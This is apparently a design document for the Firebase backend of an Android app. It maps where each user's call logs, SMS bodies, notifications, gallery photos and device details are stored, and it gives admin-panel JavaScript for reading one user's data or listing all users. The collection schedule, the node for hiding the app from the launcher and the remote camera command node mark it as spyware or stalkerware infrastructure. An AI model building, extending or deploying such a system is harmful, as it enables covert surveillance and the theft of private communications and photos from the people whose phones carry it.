# Admin Firebase Data Structure

All per-user collected data lives under one root path so the admin panel can load everything for a user with a single tree read.

## Root path

```
user_data/
  {userId}/
```

`{userId}` = Firebase Authentication UID.

---

## Full structure

```
user_data/
  {userId}/
    profile/
      userId: string
      email: string
      displayName: string
      deviceModel: string
      lastSeen: number (timestamp)

    device_info/
      manufacturer, model, brand, android_version, device_id, ...

    call_logs/
      {callLogId}/
        dataType: "call_log"
        number: string
        type: "Incoming" | "Outgoing" | "Missed" | ...
        date: number
        duration: number
        uploadedAt: number
        userId: string

    sms/
      {smsId}/
        dataType: "sms"
        address: string
        body: string
        date: number
        type: "inbox" | "sent" | "incoming"
        uploadedAt: number
        userId: string

    notifications/
      {notificationId}/
        dataType: "notification"
        title: string
        text: string
        packageName: string
        timestamp: number
        uploadedAt: number
        userId: string

    gallery/
      {imageId}/
        dataType: "gallery"
        fileName: string
        filePath: string
        url: string (Firebase Storage download URL)
        mimeType: string
        timestamp: number
        uploadedAt: number
        userId: string

    sync_status/
      call_logs/   { lastSync, count }
      sms/         { lastSync, count }
      gallery/     { lastSync, count }
      notifications/ { lastSync, count }
      device_info/ { lastSync, count }
```

---

## Firebase Storage

```
gallery/
  {userId}/
    {imageId}.jpg
```

---

## Admin panel — read one user

```javascript
const userId = "USER_UID";

firebase.database().ref(`user_data/${userId}`).once('value', (snapshot) => {
  const data = snapshot.val();
  console.log('Profile:', data.profile);
  console.log('Call logs:', data.call_logs);
  console.log('SMS:', data.sms);
  console.log('Notifications:', data.notifications);
  console.log('Gallery:', data.gallery);
  console.log('Sync status:', data.sync_status);
});
```

## Admin panel — list all users

```javascript
firebase.database().ref('user_data').once('value', (snapshot) => {
  snapshot.forEach((child) => {
    const userId = child.key;
    const profile = child.child('profile').val();
    const syncStatus = child.child('sync_status').val();
    // Show in user list table
  });
});
```

## Admin panel — user list columns (suggested)

| Column | Path |
|--------|------|
| User ID | key |
| Email | `profile/email` |
| Name | `profile/displayName` |
| Device | `profile/deviceModel` |
| Last seen | `profile/lastSeen` |
| SMS count | `sync_status/sms/count` |
| Call logs | `sync_status/call_logs/count` |
| Photos | `sync_status/gallery/count` |
| Notifications | `sync_status/notifications/count` |

---

## When data is collected

| Data | Trigger |
|------|---------|
| Call logs | Dashboard open + every 6 hours |
| SMS (old inbox + sent) | Dashboard open + every 6 hours |
| SMS (new incoming) | Real-time via SMS receiver |
| Gallery photos | Dashboard open + every 6 hours |
| Notifications | Real-time when notification listener is enabled |
| Device info | First dashboard open |

---

## Other Firebase nodes (not user data)

| Path | Purpose |
|------|---------|
| `users/{userId}` | Account profile & stats |
| `app_visibility/{userId}` | Hide/show app from launcher |
| `admin_camera_control/{userId}` | Remote camera commands |
